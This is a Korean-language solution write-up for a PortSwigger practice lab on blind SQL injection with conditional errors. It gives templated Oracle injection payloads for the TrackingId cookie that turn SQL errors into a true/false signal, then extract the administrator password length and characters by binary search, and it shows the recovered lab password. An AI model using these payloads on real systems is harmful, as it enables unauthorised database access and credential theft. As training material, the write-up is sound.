---
title: "Blind SQL injection with conditional errors"
tags:
  - portswigger
  - sql-injection
lab_url: "https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors"
difficulty: Practitioner
note_kind: solution
draft: false
---

# Blind SQL injection with conditional errors

## 문제

`TrackingId` 쿠키가 SQL 조회에 들어간다. 조회 결과는 화면에 보이지 않지만 SQL 오류가 나면 응답이 달라진다. 주어진 `users(username, password)` 테이블에서 `administrator`의 비밀번호를 알아내 로그인하는 실습이다.

[PortSwigger 실습](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

## 풀이 기록

### 1. 오류를 참·거짓 신호로 확인

원래 쿠키 값 뒤에 `UNION SELECT`를 붙여 조건이 참일 때만 `1/0`을 계산하도록 했다. `1=2`는 HTTP 200, `1=1`은 HTTP 500이었다. 따라서 이 인스턴스에서는 **500을 참, 200을 거짓**으로 읽을 수 있었다. `TO_CHAR`는 `CASE`의 두 결과를 문자열로 맞춘다.

~~~sql fragment
<원래 TrackingId>' UNION SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'x' END FROM dual -- -
~~~

시간 분산을 이용하려는 실험에서는 단계 수에 따른 차이가 재현되지 않아 판정 신호로 사용하지 않았다.

### 2. 비밀번호 길이 확인

`LENGTH(password)`가 중간값보다 큰지 물으며 범위를 절반씩 줄였다. `administrator`의 비밀번호 길이는 **20자**였다.

~~~sql fragment
<원래 TrackingId>' UNION SELECT CASE WHEN (
  (SELECT LENGTH(password) FROM users WHERE username='administrator') > <중간값>
) THEN TO_CHAR(1/0) ELSE 'x' END FROM dual -- -
~~~

### 3. 문자별 ASCII 이진 탐색

1번부터 20번 위치까지 `ASCII(SUBSTR(password, 위치, 1))`를 중간값과 비교했다. 각 요청의 200/500 결과에 따라 다음 탐색 범위를 좁혔다.

~~~sql fragment
<원래 TrackingId>' UNION SELECT CASE WHEN (
  (SELECT ASCII(SUBSTR(password, <위치>, 1))
   FROM users WHERE username='administrator') > <중간값>
) THEN TO_CHAR(1/0) ELSE 'x' END FROM dual -- -
~~~

추출한 값은 `r1dh0o4d1wwq9nz7lox8`이었다. 비밀번호 전체를 조건으로 다시 물어 **검증 성공**을 확인했다. 요청을 만들 때는 PowerShell의 `CookieContainer` 대신 `Cookie` 헤더를 직접 사용했다.

![비밀번호 길이와 20개 문자를 추출하고 최종 검증한 PowerShell 결과](images/lab-conditional-errors/01-extracted-password.png)

### 4. 관리자 로그인

확인한 비밀번호로 로그인하자 `administrator` 계정 화면에 실습 완료 배너가 표시됐다.

![administrator 로그인 후 실습 완료 화면](images/lab-conditional-errors/02-administrator-solved.png)

## 정리

조회 결과가 숨겨져 있어도 조건에 따라 오류를 발생시키면 응답 상태를 한 비트의 신호로 쓸 수 있다. 먼저 참·거짓 조건의 응답을 확인한 뒤 길이와 문자 값을 차례대로 좁혀 비밀번호를 복원했다.

## 관련 개념

- [SQL 기초와 SQL 인젝션이 생기는 원리](../../concepts/sql-injection-foundations.md)
